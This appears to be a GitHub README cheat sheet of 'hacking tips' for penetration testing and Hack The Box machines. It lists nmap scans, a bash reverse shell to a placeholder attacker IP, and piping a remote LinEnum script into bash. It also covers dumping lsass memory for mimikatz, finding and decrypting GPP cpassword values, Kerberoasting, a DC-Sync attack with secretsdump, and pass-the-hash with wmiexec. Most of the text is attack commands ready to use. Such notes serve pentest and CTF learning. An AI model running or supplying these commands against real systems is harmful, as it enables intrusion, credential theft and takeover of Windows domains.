# Usefull-hacking-tips
Some books you want to read:<br>
<ul>
<li><a href="https://amzn.to/3TGFCpC" target="_blank">The OSINT Handbook: A practical guide to gathering and analyzing online information</a></li>
<li><a href="https://amzn.to/3PwtVzp" target="_blank"> Advanced Penetration Testing with Kali Linux: Unlocking industry-oriented VAPT tactics</a></li>
  <li><a href="https://amzn.to/3VregVQ" target="_blank">Fighting Phishing: Everything You Can Do to Fight Social Engineering and Phishing</a></li>
</ul>

usefull tips and tools for hacking
<ul>
  <li> create a file with a range of ip addresses: seq -f "10.10.10.%g" 1 254 > ip.txt
  <li> or use prips 10.0.0.0/23 > ip.txt (first install prips: apt install prips)
  <li>echo  $HISTFILE to check the history file location
</ul>

<b>Port scan commands</b>
<ul>
  <li> nmap -T4 -sV -sT --reason -p1-65535 --vv -oN 'filename' 'IP'
  <li> nmap -sC -sV -oA filename ip - ippsec parameters
  <li> nmap --script vuln 'IP'
  <li> nmap -sV -sC -A -oN filename ip
  <li> unicornscan -r300 -mU 'IP' - UDP scan. USE -mT for TCP
</ul>

<b>IpSec</b>
<ul>
  <li> python -m SimpleHTTPServer PORT
  <li> curl IP:PORT/LinEnum.sh | bash
</ul>

<b>SMB scan</b>
<ul>
  <li> smbclient -N //ip/sharename
</ul>

<b>Priv Esc</b>
<ul>
  <li> sudo -l
  <li> https://github.com/ohpe/juicy-potato  
</ul>

    
<b>Shell</b>
<ul>
  <li> python -c 'import pty; pty.spawn("/bin/sh")'
  <li> python -c 'import pty; pty.spawn("/bin/bash")'
  <li> bash -c 'bash -i >& /dev/tcp/YOURIP/PORT 0>&1'
  <li> when having a shell type CTRL-Z to background the shell. then type stty raw -echo and then fg
</ul>

<b>WPscan</b>
<ul>
  <li> wpscan -u URL -eu -ep -et
</ul>


<b>IPSEC hackthebox</b>
<ul>
  <li> juicypotato windows priv esc - Conceal https://www.youtube.com/watch?v=1ae64CdwLHE
  <li> setuid viewuser - Irked https://www.youtube.com/watch?v=OGFTM_qvtVI
  <li> hackthebox squid server - https://www.youtube.com/watch?v=5wyvpJa9LdU
</ul>

<b>Bloodhound</b>
<ul>
  <li> wget -O - https://debian.neo4j.org/neotechnology.gpg.key | sudo apt-key add -
  <li> echo 'deb https://debian.neo4j.org/repo stable/' | sudo tee /etc/apt/sources.list.d/neo4j.list
  <li> sudo apt-get update
  <li> apt-get install neo4j
  <li> apt-get install bloodhound
  <li> neo4j start (set the admin password in the browser)
  <li> bloodhound
</ul>

<b>Screenshot</b>
<ul>
  <li>gowitness-2.1.2-windows-amd64.exe scan --cidr 192.168.230.0/24 --threads 10
  <li>gowitness-2.1.2-windows-amd64.exe scan -f ip_in_file.txt --threads 10
  <li>gowitness-2.1.2-windows-amd64.exe report serve
</ul>

<b>Procdump</b>
<ul>
  <li> procdump lsass https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php
  <li>
</ul>

<b>cpassword</b>
<ul>
  <li> findstr -S cpassword $env:logonserver\sysvol\*.xml
  <li> crack passwords with https://github.com/t0thkr1s/gpp-decrypt
</ul>

<b>Find string with grep</b>
<ul>
  <li> grep -oP '(?<="InsertSearchString": ")[^"]*'
  
</ul>

<b>Run pingcastle fromt CMD </b>
<ul>
  <li> PingCastle.exe --server dc.local --user xxxx --password xxxx --healthcheck
  <li> PingCastle.exe --server x.x.x.x --export users --user domainuser --password domainpassword
  
</ul>

<b>Find in Linux</b>
<ul>
  <li>find -L . -name "foo*"</li>
</ul>

<b>Kerberos attacks </b>
<ul>
  <li> From a non-domain PC: python GetUsersSPN.py -dc-ip x.x.x.x bla.local/account:password -request
  <li> or from a domain joined PC python GetUsersSPN.py bla.local/account:password -request
  <li>
  <li> DC-Sync attack: python secretsdump.py bla.local/account:password@dc1.bla.local
  <li> if that works you can use python wmiexec.py bla.local/account@dc1.bla.local -hashes "insert hash"
</ul>

<b>find installed MSI's</b>
<ul>
  <li> Get-WmiObject Win32_Product | Format-Table IdentifyingNumber, Name
  wmiexec /fa ID
</ul>

<b>Check for AD or Azure AD joined</b>
<ul>
  <li> dsregcmd /status
</ul>


<b>Blacklist IP's when installing letsenscrypt</b>
180.188.243.95
79.137.68.184
134.122.89.242
144.126.198.24
51.81.245.138
45.142.96.48
168.151.165.42
180.149.11.253
119.12.180.71
18.170.66.210
161.35.246.138
51.75.141.254
46.246.122.80
34.220.105.216
185.220.100.247
104.129.18.188
154.47.30.167
84.247.116.160
45.87.212.76
104.244.209.36
34.248.137.227
54.247.57.72
37.19.210.17
66.115.189.222
51.81.46.212
135.148.100.196
96.9.246.196
5.181.234.134
104.166.80.40
104.166.80.254
45.56.71.92
79.125.7.88
66.115.165.233
